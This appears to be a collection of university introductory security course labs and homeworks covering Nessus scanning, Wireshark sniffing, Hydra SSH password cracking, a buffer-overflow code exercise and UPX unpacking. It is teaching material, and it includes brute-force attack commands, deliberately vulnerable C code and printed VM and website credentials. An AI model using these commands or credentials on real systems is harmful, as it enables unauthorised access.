2.         The network settings of Kali VM should be Attached to: Bridge Adapter. Example is shown in below screen shot. And change metasploitable2 and ubuntu-desktop network setting to host only.

3.         Compiling plugins during initialization phase of Nessus might take lot of time depending on the size of RAM.

4.         Allocate 8GB to Kali-20 if you have enough RAM space available.

  


Let’s begin the installation, configuring, and starting of Nessus by opening a terminal window:

Note: If you are unable to download the Nessus please change Network settings to “NAT” and after installing all turn it Back to “Bridger Adapter” to perform the lab.
⦁        Open the firefox esr web browser and navigate to the following 

URL: http://www. tenable.com/products/nessus/select-your-operating-system.
 

⦁        Select Nessus-8.9.0-debian6_amd64.deb or Latest Version of it.
⦁        Download the file to your local root directory.
⦁        Open a terminal window.
⦁        Execute the following command to install Nessus: 

sudo dpkg –i ""Nessus-8.9.0-debian6_amd64.deb"" //Nessus will be installed under the /opt/nessus directory

 


 
⦁        Once the installation completes, you can run Nessus by typing the following command:
sudo /bin/systemctl start nessusd.service        //this starts the Nessus and runs in the background

 

NOTE: To register your copy of Nessus, you must have a valid license (product key), which can be obtained from http://www.tenable.com/products/nessus/nessus-essentials. After you register the activation key will be sent to your mail address specified.

 

⦁        Enable your Nessus install by executing the following command. You need to register and obtain activation Code prior to this instruction. Registration details are in above instructions.

sudo /opt/nessus/sbin/nessuscli fetch --register XXXX-XXXX-XXXX-XXXX- XXXX

In this step, we will also grab the latest plugins from http://plugins.nessus.org.


 

⦁        Now enter the following command in the terminal

sudo /opt/nessus/sbin/nessuscli adduser           //adds the user to access nessus

⦁        At the login prompt, enter the login name of the user. 
⦁        Enter the password of your choice twice. 
⦁        Answer as Y (Yes) to make this user an administrator.

 

⦁         Once complete, you can run Nessus by typing the following command (it won't work without a user account)

sudo /bin/systemctl start nessusd.service

 



13. Now got to URL “https://127.0.0.1:8834/html5.html#/” which will bring you to below page. Add Exception and confirm the security Exception.

 

 

14. Select “Nessus Essentials”.

15. Create account following the steps.
 


Refresh the page to see update bar. 

 

This may take some time (~45min).

Once initialization is finished, restart Kali VM with network settings changed to bridged adapter if you are using NAT. Restart nessusd by using “sudo /bin/systemctl start nessusd.service”. Open nessus URL “https://127.0.0.1:8834/html5.html#/” in firefox esr again and login.


Q1. Provide Screen Shot of your above Logged in Nessus Page.


Nessus – finding Local Vulnerabilities:
Now that we have Nessus installed and configured, we will be able to begin testing of our first set of vulnerabilities. Nessus allows us to attack a wide range of vulnerabilities depending on our feed, and we will confine our list of assessing the vulnerabilities of our target to those specific to the type of information we seek to gain from the assessment. In this recipe, we will begin by finding local vulnerabilities. These are vulnerabilities specific to the operating system we are using.

Disable Firewalls if you get empty reports after the scan.

Let's begin the process of finding vulnerabilities with Nessus by opening the web browser: 
1. Log in to Nessus at https://127.0.0.1:8834. 
2. Click on “Scans” on the Top Menu Bar. 
 

3. Click on New Scan. You Will see the below window, select Advanced Scan.

 

4. Click on Advanced Scan, perform the following tasks: 
⦁        Under General Type, 
⦁        Enter a name for your scan. We chose Local Vulnerability Assessment.
⦁        Let the Folder field be My Scans.
⦁        Choose your targets considering the following points:
⦁        Targets must be entered one per line.
⦁        You can also enter ranges of targets on each line.
⦁        You may also upload a target's file (if you have one) or select Add Target IP Address.
⦁        To enter the host IP address, go to virtual box and start metasploitable 2 (network settings as bridged adapter)giving username and password as msfadmin.
⦁        Then type ifconfig to obtain the ipaddress
 

 


5. On the Plugins tab, select Disable All and Enable the following specific vulnerabilities: 
⦁        Ubuntu Local Security Checks 
⦁        Default Unix Accounts
⦁        DNS
⦁        FTP
⦁        SMTP Problems
⦁        SNMP
⦁        Settings
⦁        Web Servers
⦁        Denial of Service

 

6. Click on save to save your new scan. 

        
7. Click on Launch.

 

10.         You will get a confirmation and your test will complete (depending on how many targets are selected and the number of tests performed).
11.         Once completed, you can export a report.

           

12. Double-click on the report to analyze the following points (on the Results tab):
⦁        Each target in which vulnerability is found will be listed 
⦁        Double-click on the IP address to see the ports and issues on each port 
⦁        Click on the number under the column to get the list of specific issues/vulnerabilities found 
⦁        The vulnerabilities will be listed in detail
 

13. Click on export Report.

Q2.         Attach the Downloaded report while submitting and write down summary of scanned analysis in brief.


Nessus – Finding network vulnerabilities:
Nessus allows us to attack a wide range of vulnerabilities depending on our feed, and we will confine our list of assessing the vulnerabilities of our target to those specific to the type of information we seek to gain from the assessment. In this recipe, we will configure Nessus to find network vulnerabilities on our targets. These are vulnerabilities specific to the machines or protocols on our network.

To complete this recipe, you will need a virtual machine(s) to test against: Start all VM’s with network settings as bridged adapter.

⦁        Metasploitable 2.0 (VM creds: msfadmin/msfadmin)
⦁        UbuntuDesktop VM (VM creds: sec-lab/untccdc)   Use the cscelab.ova file.

1.   Log in to Nessus at https://127.0.0.1:8834.
2.   Go to Scans.
3.   Click on “New Scan” then Select “Advanced Scan”.
⦁        Under General Type, 
⦁        Enter a name for your scan. We chose, Internal Network Scan.
⦁        Let the Folder field be My Scans.
⦁        Choose your targets considering the following points:
⦁        Targets must be entered one per line
⦁        You can also enter ranges of targets on each line
⦁        You may also upload a target's file (if you have one) or select Add Target IP Address.
⦁          To enter the host ip address go to virtual box and start metasploitable 2 giving username and password as msfadmin and Start Ubuntu desktop VM with user id as sec-lab and password as untccdc. You can use your own windows IP address for use.
⦁        Then type ifconfig to obtain the ipaddress in Ubuntu and metasploitable. 


 

9. On the Plugins tab, click on Disable All and select the following specific vulnerabilities:
⦁        CISCO
⦁        DNS
⦁        Default Unix Accounts
⦁        FTP
⦁        Firewalls
⦁        Gain a shell remotely
⦁        General
⦁        Netware
⦁        Peer-To-Peer File Sharing
⦁        Policy Compliance
⦁        SCADA
⦁        SMTP Problems
⦁        SNMP
⦁        Service Detection
⦁        Settings



10. Click on save to save your new scan

11. On the main menu, click on the Scan. Then Click on Launch button to start scanning.

12. Once completed, you will receive a report inside of the Results tab.
13. Double-click on the report to analyze the following points:
⦁        Each target in which a vulnerability is found will be listed
⦁        Double-click on the IP address to see the ports and issues on each port
⦁        Click on the number under the column to get the list of specific issues vulnerabilities found
⦁        The vulnerabilities will be listed in detail

 
14. Click on export Report 

Q3.         Attach the Downloaded report while submitting and write down summary of scanned analysis in brief. 





Nessus – Finding Linux-specific vulnerabilities:
To complete this recipe, you will need a virtual machine(s) to test against:
 
⦁        Ubuntu Desktop
⦁        Metasploitable

⦁        Start a new scan  advanced settings.
⦁        Give Target ip’s of Ubuntu Desktop and Metasploitable.

 


 





3.  On the Plugins tab, click on Disable All and enter the following specific vulnerabilities. This list is going to be rather long as we are scanning for services that may be running on our Linux target:
⦁        Backdoors
⦁        Brute Force Attacks
⦁        CentOS Local Security Checks
⦁        DNS
⦁        Debian Local Security Checks
⦁        Default Unix Accounts
⦁        Denial of Service
⦁        FTP
⦁        Fedora Local Security Checks
⦁        Firewalls
⦁        FreeBSD Local Security Checks
⦁        Gain a shell remotely
⦁        General
⦁        Gentoo Local Security Checks
⦁        HP-UX Local Security Checks
⦁        Mandriva Local Security Checks
⦁        Misc
⦁        Red Hat Local Security Checks
⦁        SMTP Problems
⦁        SNMP
⦁        Scientific Linux Local Security Checks
⦁        Slackware Local Security Checks
⦁        Solaris Local Security Checks
⦁        SuSE Local Security Checks
⦁        Ubuntu Local Security Checks
⦁        Web Servers




4. Click on “Save” to save your new scan.

5. Run and export the scan results. 

Q4.         Attach the Downloaded report while submitting and write down summary of scanned analysis in brief.


"
"['packet sniffing lab', 'packet sniffing', 'sniffing lab', 'wireshark', 'http', 'packet', 'lab', 'start', 'start wireshark', 'http packets', 'sniffing', 'http stream', 'attach a screenshot', 'packet capture', 'screenshot', 'packets', 'capture', 'attach', 'credentials', 'command prompt', 'note', 'csce', 'fall', 'capture in wireshark', 'stream']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Packet Sniffing,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Packet Sniffing Lab
Lab 1b: Packet Sniffing
This lab uses the Kali 2020 virtual machine (VM). The credentials are: 
Username: osboxes
Password: osboxes.org
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as 
described in the Command Prompt Customization Manual. This customization manual directs 
you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do 
not comply with this requirement will receive no credit.
• Login to the Kali 2020.
• Open the terminal and start Wireshark: type “wireshark”
NOTE: If you close the Wireshark application, remember to start it using the “wireshark”
command. (Do not use the menu to start Wireshark, because then you may not have the root privileges 
and so the packet capture may not work.)
• Select the interface eth0 in the window and click Capture ® Start (or the blue fin button 
– as shown on the screenshot below) to start sniffing.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Packet Sniffing Lab
Note: If no network applications are running on your VM, no packets will be captured. 
So, let us generate some packets as follows:
• Open Firefox (Application ® Favorites ® Web Browser)
and browse a website “www.unt.edu”.
Q1: Use the filter http.host==www.unt.edu (as shown on the screenshot below). 
What is an IP address of the website? Attach a screenshot of the result.
• Using the same filter, expand the HTTP bar as shown below
Use the information displayed by Wireshark to find out the following information.
Q2: What browser (software client) was used in this HTTP request? (Attach a screenshot supporting 
your answer.)
Q3: What is the client’s OS? (Attach a screenshot supporting your answer.)
Q4: Which flags were set in the Transmission Control Protocol (TCP)?
Explain why those flags were set.
• Stop the packet capture in Wireshark using the red square button (see the screenshot below).
• Start a new capture in Wireshark. 
(You may choose a “Continue without saving” option when prompted.)
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Packet Sniffing Lab
• Browse the website cse.unt.edu/downloads/vm and login with the following credentials:
username: vmdownload
password (bold are numbers): d0wnloadVMf1les! 
• Stop the capture in Wireshark.
• Filter packets with http.host==cse.unt.edu
• Right-click on the HTTP packets, choose Follow ® HTTP Stream, and you will see a stream as 
shown in the below picture.
• Inspect the packets this way until you see that the following line:
Authorization : Basic <encoded message>
Q5: Attach a screenshot of the HTTP stream where you found the encoded credentials.
Note: These credentials are encoded using base64 but not encrypted, therefore we can simply decode 
them as follows.
• Decode <encoded authentication credential> using base64 decoder to get the password and 
username. For that, in the top window, select the HTTP packet that contains the credentials. 
In the middle window, select the line starting with “Authorization”. 
Then, Analyze ® Show Packet Bytes…
In the new window, you will see the line “Authorization : Basic <encoded message>”.
Since you only need the credential to be decoded, set the “Start” field to “21” and the “End” 
field to “57” to select the credential data, and set “Decode as” option to “Base64”.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Packet Sniffing Lab
Q6: Attach a screenshot of the decoded credentials.
Note: In practice, you may have to do a little research in order to figure out how to perform decoding.
The above item provides an end point of this “little research” in order to give you a shortcut—to skip 
technical details and save time.
Now, start a new capture in Wireshark.
Browse the website “canvas.unt.edu” and login with your EUID and password.
Stop the packet capture in Wirehark.
Use the filter “http.host ==canvas.unt.edu”.
Check the HTTP stream for all the (outgoing) HTTP packets, you will see a stream as shown below:
Q7: Can you find your credentials on the stream? Explain your answer.
Hint for the above question: Perform the following steps. Run the terminal and ping “canvas.unt.edu” 
to find out its IP address – we will denote the value which you found as 
[ip-address]. Set the filter in the Wireshark as follows “ip.host==[ip-address]”.
Observe what protocol was used for communication between your browser and the Canvas website."
"['ova file cscelab.ova', 'password cracking lab', 'cscelab.ova on canvas', 'ova file', 'cracking lab', 'password cracking', 'password', 'hydra', 'note', 'attack', 'lab', 'ubuntu', 'canvas', 'euid', 'brute-force attack', 'cracking', 'ova', 'virtual machine', 'username', 'file cscelab.ova', 'letters', 'user', 'command', 'time', 'brute-force']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Password Cracking 1,Lab,"Lab 5b:
Password Cracking Lab
This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. The credentials are as follows: 
Username: sec-lab
Password: untccdc
NOTE 1: For your lab report, you need to reply questions which are marked in red.
NOTE 2: Make sure that your hostname is your EUID with a ‘lab’ suffix and for your default user, use your EUID. For example, assuming your EUID is ab1234, the computer name (hostname) would be ab1234lab and the user would be ab1234.
NOTE 3: When it is required to “attach a screenshot”, feel free to attach several screenshots if needed. If the screenshot requires your terminal and commands, you need to make sure that your hostname and username are clearly visible. 
NOTE 4: When you are running a command, you have to be extra careful. Especially when you are applying an attack, if you provide a wrong command or parameter, you may cause a bigger harm than expected. Therefore, you are responsible for your commands.
Objectives 
The objective of this lab is to apply both brute-force and dictionary attacks using a famous password cracker tool called Hydra. 
Our scenario will be as follows: You are an attacker who has access to the computer and you are interested in finding the password of the other user(s). You observed that there is SSH login only; so, you will try with brute-force attack and also the dictionary attack.
Hydra supports many protocols, including (but not limited to) FTP, HTTP, HTTPS, MySQL, MSSQL, Oracle, Cisco, IMAP, VNC, and many more. One should note however that this type of attack may be detected due to multiple login attempts. 
We can use Hydra through the terminal or the GUI application (xHydra); however, the terminal gives us more flexibility and control. Therefore, the lab will contain only terminal based work from now on.
Brute-Force attack 
First of all, we will try brute-force attack, which requires trying all possible combinations. As you can imagine, this is a time-consuming process, especially if you don’t have any clues on the password. 
Our victim will be the user: test. Assuming that we don’t know its password, we will be trying all the possibilities. As this is not feasible for a short amount of time, instead we will do an educated guess: i.e., the password for the user test has only three lower case letters. 
Hydra runs as follows: hydra <parameters> <IP> <PROTOCOL>. Since we are applying attack to another user on the same computer, we will use 127.0.0.1 for IP and for the PROTOCOL, we will use SSH. You can find all the possible parameters for Hydra through ‘man hydra’, but we are going to run using multiple threads (-t <#THREADS> and we can use 4), declare the username (-l <USERNAME> -- in our case, the username is test), and we will ask Hydra to generate all the combinations for us through -x parameter (-x MIN:MAX:LETTERS format where min and max number of letters are given and then the type of the letters are provided. For our case, we know that it is using three letters only so both min and max will be 3. And, we know that it only has lower-case letters, we will use ‘a’. Hence, our input will be 3:3:a. If we had upper case only, then it would be 3:3:A or we had lower and upper case three characters 3:3:aA. We could even include numbers, such as 3:3:aA1). We are also interested in the execution time, so we are going to note how long it takes to try using time command. In conclusion, our command will be as follows: 
time hydra -t 4 -l test -x 3:3:a 127.0.0.1 ssh
When it finds the password, you can exit the execution by pressing CTRL-C. 
Q1: Provide a screenshot of your running code. 
Q2: How long did it take to run? 
Q3: What is the found password? 
Dictionary attack 
Not always we are this lucky to get the clues for the password. However, there are other options. For example, when we search a bit, we can see that there are some commonly used passwords (they are found through studies after breaches occur). You can find multiple lists online. Now, we will try a commonly used password list instead of brute-force attack (-P <password_list>). Hence, following is our command now: 
time hydra -t 4 -l test -P /opt/hydra/common_passwd.txt 127.0.0.1 ssh 
Q4: Provide a screenshot of your running code. 
Q5: How long did it take to run?
Q6: A bit of research time: Search the web and find the most commonly used 10 passwords. What are they? What is common for them?  "
"['password cracking lab', 'password', 'cracking lab', 'password cracking', 'hydra', 'lab', 'attack', 'brute-force attack', 'command', 'cracking', 'letters', 'user', 'command prompt', 'brute-force', 'note', 'passwords', 'test', 'case', 'ssh', 'screenshot', 'username', 'dictionary attack', 'password list', 'time hydra', 'run']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Password Cracking 2,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Password Cracking Lab
Lab 5b: Password Cracking Lab
In this lab, you will be using the Ubuntu 20 VM. The credentials are: 
Username: sec-lab
Password: untccdc
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g. “Who is the owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described 
in the Command Prompt Customization Manual. This customization manual directs you to place your 
EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this 
requirement will receive no credit.
Objectives
The objective of this lab is to apply both brute-force and dictionary attacks using a popular password 
cracker tool called Hydra. 
Our scenario will be as follows: You are an attacker who has access to the computer and you are 
interested in finding the password of another user(s). You observed that there is SSH login only; so, 
you will try the brute-force attack and the dictionary attack.
Hydra supports many protocols, including (but not limited to) FTP, HTTP, HTTPS, MySQL, MSSQL, 
Oracle, Cisco, IMAP, VNC, and many more. One should note however that this type of attack may be 
detected due to multiple login attempts. 
We can use Hydra through the terminal or the GUI application (xHydra); however, the terminal gives 
us more flexibility and control. Therefore, we will use the latter option in this lab.
Section 1: Brute-Force attack 
First of all, we will try the brute-force attack, which requires trying all possible combinations. As you 
can imagine, this is a time-consuming process, especially if you do not have any clues on the password. 
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Password Cracking Lab
Our victim will be the user test. Assuming that we do not know their password, we will be trying all the 
possibilities. As this is not feasible for a short amount of time, instead we will make an educated guess
that the password for the user test has only three lower case letters. 
Hydra runs as follows: hydra <parameters> <IP> <PROTOCOL>. Since we are applying attack to 
another user on the same host, we will use 127.0.0.1 for IP and for the PROTOCOL, we will use SSH. 
(You can find all the possible parameters for Hydra through ‘man hydra’.) In this lab, we will use 
multiple threads (-t <#THREADS>, and we can use 4), declare the username (-l <USERNAME> – in 
our case, the username is test). Also, we will ask Hydra to generate all the combinations for us through 
-x parameter (-x MIN:MAX:LETTERS format, where min and max number of letters are given and 
then the type of the letters are provided). For our case, we know that it is using three letters only so 
both min and max will be 3. Moreover, we know that it only has lower-case letters, so we will use ‘a’. 
Hence, our input will be 3:3:a. If we had upper case only, then it would be 3:3:A, or if we had both, it 
would be 3:3:aA. We could also include numbers, such as 3:3:aA1. We are also interested in the 
execution time, so we are going to note how long it takes for this command to run. In conclusion, our 
command will be as follows: 
time hydra -t 4 -l test -x 3:3:a 127.0.0.1 ssh
When it finds the password, you can exit the execution by pressing Ctrl-C. 
Q1: Attach a screenshot of the result. 
Q2: How long did it take the attack to run? 
Q3: What is the found password?
Section 2: Dictionary attack
The attacker is often not lucky enough to get the clues for the password. In this case, the attacker may 
rely on the fact that there are some commonly used passwords (they are found through studies of 
the breaches, which occurred in practice). Multiple such lists are available online. Now, we will try 
a commonly used password list instead of the brute-force attack (-P <password_list>). 
Run the following command: 
time hydra -t 4 -l test -P /opt/hydra/common_passwd.txt 127.0.0.1 ssh 
Q4: Attach a screenshot of the result. 
Q5: How long did it take the attack to run?
Q6: Search the web and find the five most commonly used passwords from the 2009 Rockyou 
password list. (Provide these five passwords.)"
"['points', 'program', 'bank', 'attacker', 'src', 'canvas chapter', 'pdf document', 'document in canvas', 'message', 'url', 'security', 'list', 'trojan horse', 'explain', 'sum', 'char', 'base', 'dst', 'code', 'program properly sets', 'trojan', 'web', 'program properly', 'february', 'computes']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,"Programs, Programming",Homework,"Homework 2
Due: 11:59 PM on Friday, February 18, 2022
Form of submission: Word, Text, or PDF Document in Canvas

Chapter 3 – Programs and Programming (Security in Computing, 5/e)
        
(12 Points) A program is written to compute the sum of the integers from 1 to 10. The programmer, well trained in reusability and maintainability, writes the program so that it computes the sum of the numbers from k to n. However, a team of security specialists scrutinizes the high-level code. The team certifies that this program properly sets k to 1 and n to 10; therefore, the program is certified as being properly restricted in that it always operates on precisely the range 1 to 10. List at least two different ways that this program can be sabotaged so that during execution it computes a different sum, for example, 3 to 20.




(12 Points) Without your knowledge, a malicious Trojan horse has been planted in your default web browser that you frequently use to access your bank account online. The attacker that planted the Trojan horse already set up the backdoor to silently capture your account number and password, but he/she needs a way to get this information off of your computer and sent across the network to himself/herself.
List two covert channels that the attacker can use to leak information about your bank accounts to himself/herself somewhere in the network. You may assume that the attacker can arrange to host a web site that you will visit or even sniff HTTP GET requests. There are lots of possibilities – be creative, but be specific to this scenario!




(12 Points) List three controls that could be applied to detect or prevent off-by-one errors.


 

(12 Points) Explain in what circumstances penetrate-and-patch is a useful program maintenance strategy.




(12 Points) Explain why genetic diversity is a good principle for secure development. Cite an example of lack of diversity that has had or can have a negative impact on security.




(6 Points) (a) You receive an e-mail message that purports to come from your bank. It asks you to click a link for some reasonable-sounding administrative purpose. How can you verify that the message did come from your bank?




        (6 Points) (b) Now play the role of an attacker. Suppose you are able to obtain the mailing list for a certain bank. Describe what is needed to convert the e-mail message to your purposes, while still making both the bank and the customer think the message is authentic and trustworthy? Be sure to address perspectives that include both the message and the bank’s web site.
        



(12 Points) Open design would seem to favor the attacker, because it certainly opens the implementation and perhaps also the design for the attacker to study. Justify that open design overrides this seeming advantage and actually leads to solid security.





(16 Points) Consider the following code snippet in C:
char *base_url = malloc(11 * sizeof(char));
printf(""Enter an 11 character URL: "");
scanf(""%s"", base_url);
char src[11];
char dst[11];

// copies base_url to src
strncpy(src, base_url, 11);

// copies src to dest
strcpy(dst, src);
printf(""src: %s dst: %s\n"", src, dst);
Identify at least one potential buffer overflow vulnerability and explain why/how it can be exploited (i.e., not just that it’s a buffer overflow, but where the problem will manifest itself).




Rewrite the code in C that would prevent or mitigate the impact of this deficiency. Note that you may not change the first 5 lines of code.


"
"['ida freeware', 'ida freeware application', 'start ida freeware', 'ida', 'select ida freeware', 'freeware', 'file', 'select file close', 'executable', 'select file', 'ida view-a tab', 'executable file', 'ida view-a', 'freeware application', 'entire ida freeware', 'select', 'file close', 'click', 'select file open', 'windows machine', 'start ida', 'box', 'attach a screenshot', 'attach', 'select portable executable']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Reverse Engineering,Lab,"Lab 4: Reverse Engineering Lab

Signature-based detection is a process where a unique identifier (i.e., a signature) is established about a known threat so that the threat can be identified in the future. In the case of a virus scanner, this is typically a unique pattern of code that attaches to a file, or it may be a hash of a known bad file. Attackers may use a runtime packer, or self-extracting archive, to obfuscate malware in an effort to hide its existence from signature-based anti-virus software. However, we will see in this lab that even after applying obfuscation, software code can still be cracked and viewed.
Today, in this lab we are going to use a tool-based technique to unpack a UPX-packed executable to reveal the original program structure.
First, let’s see how using a runtime packer affects the following ""Hello World"" program in C++:
 
Type up this small program as HelloWorld.cpp on your Windows machine and compile, calling the resulting executable HelloWorld.exe.
IDA Freeware
If IDA Freeware is not already downloaded on your Windows machine:
⦁	Go to ⦁	https://hex-rays.com/ida-free/#download
⦁	Select IDA Freeware for Windows, which should start the downloading process.
⦁	Install on your machine (following the instructions).
We will use IDA Freeware, an interactive disassembler often used in reverse engineering, to see how packing software affects the executable.
Let’s disassemble the HelloWorld.exe file to see what it looks like:
⦁	Start IDA Freeware.
⦁	Click New to ""Disassemble a new file"" and select the HelloWorld.exe file.
⦁	In the Load a new file dialog box, select Portable executable for… and leave all other defaults as is. If you get a prompt to load DWARF debug information, leave the defaults as is and select Yes.
⦁	Under the IDA View-A tab on the right, you should see some assembly instructions with the ""Hello World!"" text clearly visible. 
⦁	Note that if you do not see the assembly code with the ""Hello World!"" text in the IDA View-A tab on the right, you can select the _main function name in the left Functions box, which should make it visible in the IDA View-A tab.
Q1: 	Attach a screenshot of the entire IDA Freeware application, including the title bar (with your EUID and the name of the file), Function box, and assembly code in IDA View-A tab. 





⦁	In IDA Freeware, select File  Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK.
You can leave the IDA Freeware application open as we will be back to using it in just a little bit.

Ultimate Packer for eXecutables (UPX)
If UPX is not already downloaded on your Windows machine:
⦁	Go to https://github.com/upx/upx/releases/tag/v3.96  
⦁	Select the appropriate version for your machine (e.g., upx-3.96-win64.zip), which should start the downloading process.
⦁	Extract the ZIP file to a selected location on your Windows machine.
We will use Ultimate Packer for eXecutables (UPX), a free, opensource executable packer used to reduce the size of programs and DLLs, to ""pack"" our executable in an effort to obfuscate the code’s footprint (i.e., signature). Programs and libraries compressed by UPX are completely self-contained and run exactly as before, with no runtime or memory penalty for most of the supported formats.
⦁	Pack the HelloWorld.exe executable using UPX using the –9 compression level option as shown in the example, saving the resulting packed executable as HelloWorld_packed.exe.
If successful, the results of the UPX command should look something like this, where the file size is visibly reduced:
 

⦁	Now, open up this new packed executable HelloWorld_packed.exe in IDA Freeware using the same options as before. You should notice a warning similar to the following, which indicates that the executable is most likely ""packed"". Click OK.
 
You should notice that the sections are reduced to maybe a couple UPX segments, which means that it may be more difficult (but not impossible) to determine what this executable does!
Q2: 	Attach a screenshot of the Functions box showing the UPX segments in the IDA Freeware application.



⦁	In IDA Freeware, select File  Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK.
Download the SimpleNum_packed.exe file to your Windows VM and run it to see what it does, paying close attention to the strings that are displayed to the terminal.
⦁	With the IDA Freeware application still open, select File  Open to disassemble the given file SimpleNum_packed.exe, using the same options as before. Again, you should notice a warning that indicates that the executable is most likely ""packed"" as before.
Verify that the sections are reduced to maybe a couple UPX segments similar to what you observed in your HelloWorld_packed.exe file.
Q3: 	Attach a screenshot of the one assembly code box in the IDA View-A tab with the text sp-analysis failed, meaning that the stack analysis failed since the stack pointer does not point to the address expected by the function type (since the executable was packed).



⦁	In IDA Freeware, select File  Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK.
⦁	Now, exit the IDA Freeware application.


x32dbg
If x32dbg is not already downloaded on your Windows machine:
⦁	Go to https://x64dbg.com/  
⦁	Click the Download button, and then select the appropriate version for your machine (e.g., snapshot_2022-10-18_22-09.zip), which should start the downloading process.
⦁	Extract the ZIP file to a selected location on your Windows machine.
We will use x32dbg, which is an open-source binary debugger for Windows that is aimed at malware analysis and reverse engineering of executables that you do not have the source code for. In particular, we want to use a ""breakpoint trick"" to see if we can restore the original binary. And while this should work with almost any debugger, we will use x32dbg for this one.
Let’s run this debugger on the SimpleNum_packed.exe file to see what it looks like:
⦁	Start x32dbg.
⦁	In x32dbg, select File  Open to open the SimpleNum_packed.exe executable file.
When loading is complete, you should initially be positioned at the Extended Instruction Pointer, EIP, under the CPU tab. However, x32dbg will put a breakpoint at pushad or EntryPoint of your binary by default that pushes the contents of the general-purpose registers onto the stack. To see this entry breakpoint, simply select the Breakpoints tab.
Q4: 	Attach a screenshot of all of the default breakpoints in the debugger for this executable. Be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID).


⦁	Now, in your list of breakpoints, double-click on the pushad operation to take you to this location. 
⦁	Then, scrolling down the binary a little bit (about 178 lines or so), search for the first jmp perhaps only a few lines down from the popad and set your breakpoint there. 
⦁	The popad operation pops all general-purpose registers. You can set the breakpoint by placing your cursor on the currently gray dot to the left of the instruction address for the jmp instruction (hovering over the gray dot should reveal a pop-up window that indicates ""Breakpoint Not Set""). Click the gray dot until it turns red, indicating ""Breakpoint Enabled"". This action should also turn the instruction address red.
Q5: 	Attach a screenshot of the binary instructions from the popad instruction to the jmp instruction where the breakpoint was set. Again, be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID).


We are going to search for the OEP (Original Entry Point) of the packed binary.
⦁	Run the program until it hits the jmp breakpoint. You can run the program by selecting Debug  Run, or clicking on the blue arrow facing the right in the x32dbg toolbar. Note that you may have to perform Debug  Run several times to get to your jmp breakpoint, if there are more breakpoints already set.
⦁	Now, single step into the jmp one time, which will take you to the OEP of the packed binary and take note of the instruction address, which should be a sub instruction. This can be done by selecting Debug  Step into, or clicking on the blue arrow facing down to a blue circle.

Q6: 	Attach a screenshot of the binary instructions from the sub instruction to include six lines or so, making sure to include a couple of the comments that indicate EntryPoint. Again, be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID).



We are going to dump the PE (Portable Executable) starting from its OEP using the Scylla plugin for x32dbg. This should already be included in your x32dbg and is shown here circled in red:
 

⦁	With the EIP pointing to this address, click on this 'S' button in your toolbar that should bring up a new window for Scylla.
⦁	In the Attach to an active process box, select your current process, which should be for SimpleNum_packed.exe and make sure your OEP is correct (i.e., the instruction address you found when stepping into the jmp instruction).

Q7: 	Attach a screenshot of the Scylla dialog box, showing the current process selected as well as the correct OEP address.


⦁	Then, click the IAT Autosearch button to scan for imports. Click Yes when prompted for advanced results. Click OK in the IAT found dialog box.
⦁	When completed, click the Get Imports button to list all the imports found.
Q8: 	Attach a screenshot of the Scylla dialog box, showing the results of the Get Imports listing.



⦁	Click the Dump button to dump the extracted binary. This should bring up a Save As dialog box. Save the binary file as SimpleNum_packed_dump.exe, which should already be filled in.
⦁	Finally, click the Fix Dump button and select the recently dumped SimpleNum_packed_dump.exe binary to fix its IAT.
You should now have the SimpleNum_packed_dump_SCY.exe file in your directory, which is the final unpacked binary that we can open in IDA Freeware and compare the call graphs.
⦁	Start IDA Freeware and then click New to ""Disassemble a new file"" and select the SimpleNum_packed_dump_SCY.exe file.
⦁	In the Load a new file dialog box, select Portable executable for… and leave all other defaults as is. Although IDA Freeware still indicates that the file was most likely packed, click OK as we shall see otherwise!
Unlike before (when we opened the original SimpleNum_packed.exe file in IDA Freeware), we should see a number of functions in the left Function name box. Remembering the strings you noted from running the packed version of this executable, double-click on the functions in the list until you find the call graph that includes all of the original strings found in the executable, which shows our original program structure!
Q9: 	Attach a final screenshot of the Functions box and call graph, with the ""function"" selected that shows the call graph of the function with the original strings from the program. Again, be sure to include the x32dbg window header information with the name of the executable and process ID (i.e., PID).



⦁	In IDA Freeware, select File  Close to close the executable file in IDA Freeware, and when prompted to save the database, check the DON'T SAVE the database box and click OK.
⦁	Now, exit the IDA Freeware application."
"['canvas chapter', 'pdf document', 'document in canvas', 'form of submission', 'digital footprint', 'briefly describe', 'due', 'february', 'word', 'text', 'introduction', 'friday', 'form', 'chapter', 'note', 'pdf', 'document', 'canvas', 'footprint', 'digital', 'control', 'software deletion', 'entry in wikipedia', 'company', 'briefly']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Secure Computing,Homework,"Homework 1
Due: 11:59 PM on Friday, February 4, 2022
Form of submission: Word, Text, or PDF Document in Canvas

Chapter 1 – Introduction (Security in Computing, 5/e)
Note that #6 is required, but no points will be deducted for your answer to this problem (unless it is not completed).

Read the following entry in Wikipedia: https://en.wikipedia.org/wiki/Digital_footprint and recall our discussion on “digital footprint” to answer the following questions:
Briefly describe two advantages of having a digital footprint.

Now, briefly describe two disadvantages of having a digital footprint.

Distinguish between vulnerability, threat, and control.


